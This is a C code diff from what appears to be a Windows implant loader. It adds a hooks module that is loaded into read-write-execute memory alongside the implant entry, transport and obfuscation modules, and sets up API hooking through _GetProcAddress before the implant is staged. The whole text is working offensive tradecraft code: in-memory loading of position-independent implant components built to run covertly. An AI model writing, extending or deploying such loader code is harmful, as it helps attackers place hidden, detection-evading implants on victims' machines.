@@ -2,9 +2,14 @@
 #include "includes/tcg.h"
 
 char __TRANSPORTMODULE__[0] __attribute__((section("transport_module")));
+char __HOOKSMODULE__[0] __attribute__((section("hooks_module")));
 
 char * findTransportModule() {
 	return (char *)&__TRANSPORTMODULE__;
+}
+
+char * findHooksModule() {
+	return (char *)&__HOOKSMODULE__;
 }
 
 #define WIN32_FUNC( x ) __typeof__( x ) * x
@@ -36,6 +41,7 @@ char * AllocateAndLoadPICO(WIN32FUNCS * funcs, char * srcPico, char * dstCode) {
 	return (char *)PicoEntryPoint(srcPico, dstCode);
 }
 
+typedef void   (*HOOK_MODULE)      (WIN32FUNCS * funcs);
 typedef char * (*TRANSPORT_MODULE) (char * path);
 typedef void   (*IMPLANT_ENTRY)    (char * stage2ptr, char * implantBase, int implantSize, char * transportModule, char * obfuscationModule);
 
@@ -60,10 +66,12 @@ void go(char * stage1ptr) {
 	VirtualFree(dstTransportCode, 0, MEM_RELEASE);
 
 	int totalSize = 100; /* padding */
+	int hooksModuleSize       = PicoCodeSize(findHooksModule());
 	int implantEntrySize      = PicoCodeSize(entryPICO);
 	int transportModuleSize   = PicoCodeSize(findTransportModule());
 	int obfuscationModuleSize = PicoCodeSize(obfuscationPICO);
 	
+	totalSize += hooksModuleSize;
 	totalSize += implantEntrySize;
 	totalSize += transportModuleSize;
 	totalSize += obfuscationModuleSize;
@@ -71,7 +79,13 @@ void go(char * stage1ptr) {
 	char * dstCode = VirtualAlloc( NULL, totalSize, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
 	char * originalDstCode = dstCode; /* save original dstCode pointer */
 
-	char * implantEntry      = AllocateAndLoadPICO(&funcs, entryPICO, dstCode);
+	char * hooksModule = AllocateAndLoadPICO(&funcs, findHooksModule(), dstCode);
+	dstCode += hooksModuleSize + 10; /* small padding */
+
+	/* Setup the hooks by the _GetProcAddress function */
+	((HOOK_MODULE) hooksModule) (&funcs);
+
+	char * implantEntry = AllocateAndLoadPICO(&funcs, entryPICO, dstCode);
 	dstCode += implantEntrySize + 10; /* small padding */
 	
 	transportModule = AllocateAndLoadPICO(&funcs, findTransportModule(), dstCode);
